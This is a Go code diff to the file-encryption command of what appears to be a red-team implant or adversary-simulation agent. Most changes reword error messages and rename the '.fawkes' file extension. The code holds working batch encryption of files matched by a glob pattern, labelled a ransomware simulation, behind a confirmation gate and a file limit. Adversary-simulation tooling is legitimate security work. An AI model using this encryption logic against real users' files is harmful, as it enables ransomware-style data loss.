@@ -38,7 +38,7 @@ const (
 
 func (c *EncryptCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return errorResult("Error: parameters required (action, path). Actions: encrypt, decrypt")
+		return errorResult("parameters required (action, path). Actions: encrypt, decrypt")
 	}
 
 	var args encryptArgs
@@ -54,7 +54,7 @@ func (c *EncryptCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if args.Path == "" {
-		return errorResult("Error: path is required")
+		return errorResult("path is required")
 	}
 
 	if abs, err := filepath.Abs(args.Path); err == nil {
@@ -75,7 +75,7 @@ func (c *EncryptCommand) Execute(task structs.Task) structs.CommandResult {
 	case "corrupt-files":
 		return corruptFiles(args)
 	default:
-		return errorResult("Error: action must be encrypt, decrypt, encrypt-files, decrypt-files, corrupt, or corrupt-files")
+		return errorResult("action must be encrypt, decrypt, encrypt-files, decrypt-files, corrupt, or corrupt-files")
 	}
 }
 
@@ -83,15 +83,15 @@ func encryptFile(args encryptArgs) structs.CommandResult {
 	// Read input file
 	info, err := os.Stat(args.Path)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("failed to stat file %q for encryption: %v", args.Path, err)
 	}
 	if info.Size() > encryptMaxFileSize {
-		return errorf("Error: file too large (%d bytes, max %d)", info.Size(), encryptMaxFileSize)
+		return errorf("file too large (%d bytes, max %d)", info.Size(), encryptMaxFileSize)
 	}
 
 	plaintext, err := os.ReadFile(args.Path)
 	if err != nil {
-		return errorf("Error reading file: %v", err)
+		return errorf("reading file: %v", err)
 	}
 	defer structs.ZeroBytes(plaintext) // opsec: clear plaintext from memory
 
@@ -100,15 +100,15 @@ func encryptFile(args encryptArgs) structs.CommandResult {
 	if args.Key != "" {
 		key, err = base64.StdEncoding.DecodeString(args.Key)
 		if err != nil {
-			return errorf("Error decoding key: %v", err)
+			return errorf("decoding key: %v", err)
 		}
 		if len(key) != aes256KeySize {
-			return errorf("Error: key must be %d bytes (got %d)", aes256KeySize, len(key))
+			return errorf("key must be %d bytes (got %d)", aes256KeySize, len(key))
 		}
 	} else {
 		key = make([]byte, aes256KeySize)
 		if _, err := io.ReadFull(rand.Reader, key); err != nil {
-			return errorf("Error generating key: %v", err)
+			return errorf("generating key: %v", err)
 		}
 	}
 	defer structs.ZeroBytes(key) // opsec: clear key material from memory
@@ -116,17 +116,17 @@ func encryptFile(args encryptArgs) structs.CommandResult {
 	// Encrypt with AES-256-GCM
 	block, err := aes.NewCipher(key)
 	if err != nil {
-		return errorf("Error creating cipher: %v", err)
+		return errorf("creating cipher: %v", err)
 	}
 
 	gcm, err := cipher.NewGCM(block)
 	if err != nil {
-		return errorf("Error creating GCM: %v", err)
+		return errorf("creating GCM: %v", err)
 	}
 
 	nonce := make([]byte, gcm.NonceSize())
 	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
-		return errorf("Error generating nonce: %v", err)
+		return errorf("generating nonce: %v", err)
 	}
 
 	// Output format: nonce + ciphertext (GCM tag appended by Seal)
@@ -142,7 +142,7 @@ func encryptFile(args encryptArgs) structs.CommandResult {
 	}
 
 	if err := os.WriteFile(outPath, ciphertext, 0600); err != nil {
-		return errorf("Error writing encrypted file: %v", err)
+		return errorf("writing encrypted file: %v", err)
 	}
 
 	var sb strings.Builder
@@ -156,16 +156,16 @@ func encryptFile(args encryptArgs) structs.CommandResult {
 	return successResult(sb.String())
 }
 
-const fawkesEncExt = ".fawkes"
+const encryptedFileExt = ".enc"
 
 // encryptFiles performs batch file encryption by glob pattern (T1486 ransomware simulation).
 // Safety: requires -confirm SIMULATE and enforces max_files limit.
 func encryptFiles(args encryptArgs) structs.CommandResult {
 	if args.Confirm != "SIMULATE" {
-		return errorResult("Error: encrypt-files requires -confirm SIMULATE (safety gate for ransomware simulation)")
+		return errorResult("encrypt-files requires -confirm SIMULATE (safety gate for ransomware simulation)")
 	}
 	if args.Path == "" {
-		return errorResult("Error: path glob pattern required (e.g., '/home/user/Documents/*.docx')")
+		return errorResult("path glob pattern required (e.g., '/home/user/Documents/*.docx')")
 	}
 
 	maxFiles := args.MaxFiles
@@ -176,7 +176,7 @@ func encryptFiles(args encryptArgs) structs.CommandResult {
 	// Expand glob pattern
 	matches, err := filepath.Glob(args.Path)
 	if err != nil {
-		return errorf("Error: invalid glob pattern: %v", err)
+		return errorf("invalid glob pattern: %v", err)
 	}
 
 	// Filter to regular files only
@@ -187,34 +187,34 @@ func encryptFiles(args encryptArgs) structs.CommandResult {
 			continue
 		}
 		// Skip already-encrypted files
-		if strings.HasSuffix(m, fawkesEncExt) {
+		if strings.HasSuffix(m, encryptedFileExt) {
 			continue
 		}
 		files = append(files, m)
 	}
 
 	if len(files) == 0 {
-		return errorResult("Error: no files matched the pattern (or all already encrypted)")
+		return errorResult("no files matched the pattern (or all already encrypted)")
 	}
 
 	if len(files) > maxFiles {
-		return errorf("Error: %d files match but max_files is %d. Increase max_files or narrow the pattern.", len(files), maxFiles)
+		return errorf("%d files match but max_files is %d. Increase max_files or narrow the pattern.", len(files), maxFiles)
 	}
 
 	// Generate a single recovery key for the entire batch
 	key := make([]byte, aes256KeySize)
 	if _, err := io.ReadFull(rand.Reader, key); err != nil {
-		return errorf("Error generating key: %v", err)
+		return errorf("generating key: %v", err)
 	}
 	defer structs.ZeroBytes(key)
 
 	block, err := aes.NewCipher(key)
 	if err != nil {
-		return errorf("Error creating cipher: %v", err)
+		return errorf("creating cipher: %v", err)
 	}
 	gcm, err := cipher.NewGCM(block)
 	if err != nil {
-		return errorf("Error creating GCM: %v", err)
+		return errorf("creating GCM: %v", err)
 	}
 
 	encrypted := 0
@@ -238,7 +238,7 @@ func encryptFiles(args encryptArgs) structs.CommandResult {
 		ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
 		structs.ZeroBytes(plaintext)
 
-		outPath := path + fawkesEncExt
+		outPath := path + encryptedFileExt
 		if err := os.WriteFile(outPath, ciphertext, 0600); err != nil {
 			errors = append(errors, fmt.Sprintf("%s: write error: %v", filepath.Base(path), err))
 			continue
@@ -256,7 +256,7 @@ func encryptFiles(args encryptArgs) structs.CommandResult {
 	sb.WriteString(fmt.Sprintf("Pattern: %s\n", args.Path))
 	sb.WriteString(fmt.Sprintf("Files encrypted: %d/%d\n", encrypted, len(files)))
 	sb.WriteString(fmt.Sprintf("Total bytes: %d\n", totalBytes))
-	sb.WriteString(fmt.Sprintf("Extension: %s\n", fawkesEncExt))
+	sb.WriteString(fmt.Sprintf("Extension: %s\n", encryptedFileExt))
 	sb.WriteString("Algorithm: AES-256-GCM\n")
 	sb.WriteString(fmt.Sprintf("Recovery Key (base64): %s\n", base64.StdEncoding.EncodeToString(key)))
 	if len(errors) > 0 {
@@ -270,43 +270,43 @@ func encryptFiles(args encryptArgs) structs.CommandResult {
 	return successResult(sb.String())
 }
 
-// decryptFiles reverses batch encryption by decrypting all .fawkes files in a directory.
+// decryptFiles reverses batch encryption by decrypting all .enc files in a directory.
 func decryptFiles(args encryptArgs) structs.CommandResult {
 	if args.Key == "" {
-		return errorResult("Error: recovery key required (base64-encoded AES-256 key from encrypt-files)")
+		return errorResult("recovery key required (base64-encoded AES-256 key from encrypt-files)")
 	}
 	if args.Path == "" {
-		return errorResult("Error: directory path required")
+		return errorResult("directory path required")
 	}
 
 	key, err := base64.StdEncoding.DecodeString(args.Key)
 	if err != nil {
-		return errorf("Error decoding key: %v", err)
+		return errorf("decoding key: %v", err)
 	}
 	defer structs.ZeroBytes(key)
 	if len(key) != aes256KeySize {
-		return errorf("Error: key must be %d bytes (got %d)", aes256KeySize, len(key))
+		return errorf("key must be %d bytes (got %d)", aes256KeySize, len(key))
 	}
 
 	block, err := aes.NewCipher(key)
 	if err != nil {
-		return errorf("Error creating cipher: %v", err)
+		return errorf("creating cipher: %v", err)
 	}
 	gcm, err := cipher.NewGCM(block)
 	if err != nil {
-		return errorf("Error creating GCM: %v", err)
+		return errorf("creating GCM: %v", err)
 	}
 
-	// Find all .fawkes files in the path (directory or glob)
+	// Find all .enc files in the path (directory or glob)
 	var files []string
 	info, statErr := os.Stat(args.Path)
 	if statErr == nil && info.IsDir() {
-		// Walk directory for .fawkes files
+		// Walk directory for .enc files
 		filepath.Walk(args.Path, func(path string, fi os.FileInfo, err error) error {
 			if err != nil {
 				return nil
 			}
-			if !fi.IsDir() && strings.HasSuffix(path, fawkesEncExt) {
+			if !fi.IsDir() && strings.HasSuffix(path, encryptedFileExt) {
 				files = append(files, path)
 			}
 			return nil
@@ -315,14 +315,14 @@ func decryptFiles(args encryptArgs) structs.CommandResult {
 		// Try as glob pattern
 		matches, _ := filepath.Glob(args.Path)
 		for _, m := range matches {
-			if strings.HasSuffix(m, fawkesEncExt) {
+			if strings.HasSuffix(m, encryptedFileExt) {
 				files = append(files, m)
 			}
 		}
 	}
 
 	if len(files) == 0 {
-		return errorResult("Error: no .fawkes files found in the specified path")
+		return errorResult("no .enc files found in the specified path")
 	}
 
 	nonceSize := gcm.NonceSize()
@@ -350,8 +350,8 @@ func decryptFiles(args encryptArgs) structs.CommandResult {
 		}
 		structs.ZeroBytes(ciphertext)
 
-		// Restore original filename by removing .fawkes extension
-		outPath := strings.TrimSuffix(path, fawkesEncExt)
+		// Restore original filename by removing .enc extension
+		outPath := strings.TrimSuffix(path, encryptedFileExt)
 		if err := os.WriteFile(outPath, plaintext, 0600); err != nil {
 			errors = append(errors, fmt.Sprintf("%s: write error: %v", filepath.Base(path), err))
 			structs.ZeroBytes(plaintext)
@@ -379,44 +379,44 @@ func decryptFiles(args encryptArgs) structs.CommandResult {
 
 func decryptFile(args encryptArgs) structs.CommandResult {
 	if args.Key == "" {
-		return errorResult("Error: key is required for decryption (base64-encoded AES-256 key)")
+		return errorResult("key is required for decryption (base64-encoded AES-256 key)")
 	}
 
 	key, err := base64.StdEncoding.DecodeString(args.Key)
 	if err != nil {
-		return errorf("Error decoding key: %v", err)
+		return errorf("decoding key: %v", err)
 	}
 	defer structs.ZeroBytes(key) // opsec: clear key material from memory
 	if len(key) != aes256KeySize {
-		return errorf("Error: key must be %d bytes (got %d)", aes256KeySize, len(key))
+		return errorf("key must be %d bytes (got %d)", aes256KeySize, len(key))
 	}
 
 	// Read encrypted file
 	ciphertext, err := os.ReadFile(args.Path)
 	if err != nil {
-		return errorf("Error reading file: %v", err)
+		return errorf("reading file: %v", err)
 	}
 	defer structs.ZeroBytes(ciphertext) // opsec: clear ciphertext from memory
 
 	block, err := aes.NewCipher(key)
 	if err != nil {
-		return errorf("Error creating cipher: %v", err)
+		return errorf("creating cipher: %v", err)
 	}
 
 	gcm, err := cipher.NewGCM(block)
 	if err != nil {
-		return errorf("Error creating GCM: %v", err)
+		return errorf("creating GCM: %v", err)
 	}
 
 	nonceSize := gcm.NonceSize()
 	if len(ciphertext) < nonceSize {
-		return errorResult("Error: encrypted file too small (corrupted?)")
+		return errorResult("encrypted file too small (corrupted?)")
 	}
 
 	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
 	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
 	if err != nil {
-		return errorf("Error decrypting: %v (wrong key or corrupted file)", err)
+		return errorf("decrypting: %v (wrong key or corrupted file)", err)
 	}
 	defer structs.ZeroBytes(plaintext) // opsec: clear decrypted plaintext from memory
 
@@ -433,7 +433,7 @@ func decryptFile(args encryptArgs) structs.CommandResult {
 	}
 
 	if err := os.WriteFile(outPath, plaintext, 0600); err != nil {
-		return errorf("Error writing decrypted file: %v", err)
+		return errorf("writing decrypted file: %v", err)
 	}
 
 	var sb strings.Builder
